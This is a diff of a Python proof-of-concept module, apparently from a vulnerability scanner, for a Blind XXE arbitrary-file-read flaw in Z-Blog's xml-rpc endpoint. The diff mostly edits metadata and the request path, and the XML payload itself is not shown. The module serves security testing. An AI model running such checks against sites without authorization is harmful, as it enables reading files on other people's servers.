@@ -6,18 +6,18 @@ hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
     vuln_id = 'Zblog_0007' # 平台漏洞编号，留空
-    name = 'Z-BLOG Blind-XXE造成任意文件读取漏洞' # 漏洞名称
+    name = 'Zblog Blind-XXE造成任意文件读取' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.LFI # 漏洞类型
     disclosure_date = '2015-06-02'  # 漏洞公布时间
     desc = '''
-        Z-BLOG Blind-XXE造成任意文件读取漏洞
+        Zblog /zb_system/xml-rpc/index.php Blind-XXE  造成任意文件读取漏洞。
     ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=098591' # 漏洞来源
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
-    product = 'Z-blog'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=098591
+    cnvd_id = 'Unkonwn' # cnvd漏洞编号
+    cve_id = 'Unkonwn' #cve编号
+    product = 'Zblog'  # 漏洞应用名称
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
@@ -33,7 +33,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            payload = 'zb_system/xml-rpc/index.php'
+            payload = '/zb_system/xml-rpc/index.php'
             url = '{target}'.format(target=self.target)+payload
             raw = '''POST /zb_system/xml-rpc/index.php HTTP/1.1
                     Content-Length: 182
@@ -56,7 +56,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 
 if __name__ == '__main__':
